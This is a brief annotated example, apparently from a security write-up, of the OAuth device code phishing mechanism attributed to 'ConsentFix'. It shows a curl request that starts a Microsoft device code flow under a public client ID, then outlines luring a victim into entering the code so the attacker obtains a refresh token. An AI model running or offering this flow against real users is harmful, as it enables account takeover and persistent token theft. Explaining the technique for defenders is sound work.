# Example of the underlying mechanism exploited by ConsentFix.
# The attacker initiates a device code flow on their end.
$ curl -X POST https://login.microsoftonline.com/<TENANT_ID>/oauth2/v2.0/devicecode \
  -d "client_id=04b07795-8d26-431e-a37c-cb14084010f4" \
  -d "scope=user.read openid profile offline_access"
  
# The attacker sends the resulting user_code to the victim via a social engineering lure.
# The victim enters the code at https://microsoft.com/devicelogin.
# The attacker receives the refresh token.
